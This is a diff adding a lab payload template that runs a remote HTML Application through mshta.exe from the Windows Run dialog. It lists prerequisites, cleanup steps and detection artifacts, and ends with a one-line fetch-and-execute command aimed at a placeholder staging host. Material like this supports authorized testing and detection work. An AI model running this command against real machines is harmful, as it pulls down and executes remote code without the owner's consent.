@@ -1,0 +1,20 @@
+# TEMPLATE: mshta-001
+# CLASS: mshta remote .hta (staged, Run dialog)
+# AUTHORIZATION: Authorized lab security research only — see payloads/README.md.
+#   STAGING_HOST must be a lab placeholder (attacker.example / RFC1918 10.x, example-only).
+# PURPOSE: Execute a staged HTML Application (.hta) via mshta.exe: the logic
+#   lives server-side and is fetched at run time, so the Run-dialog string stays
+#   short and the payload body is never keystroke-injected.
+# PREREQUISITES: Outbound HTTP from the target VM to STAGING_HOST reachable;
+#   STAGED_PATH/HTA_NAME hosted there; .hta contains (benign, lab) script.
+#   Script engines inside mshta are AMSI-instrumented on modern builds
+#   (see docs/amsi-clm-matrix.md).
+# CLEANUP: Stop mshta.exe; clear Run MRU; delete any files the .hta staged.
+# ARTIFACT: Process: mshta.exe with the full URL on its command line.
+# ARTIFACT: Network: HTTP GET to STAGING_HOST from mshta.exe.
+# ARTIFACT: Registry: RunMRU value contains the mshta URL command.
+# ARTIFACT: Script engine: child script execution occurs inside mshta.exe
+#   (JScript/VBScript), no separate wscript/cscript process.
+# ARTIFACT: Prefetch: MSHTA.EXE prefetch record updated if prefetch enabled.
+# ---
+mshta http://<STAGING_HOST>/<STAGED_PATH>/<HTA_NAME>
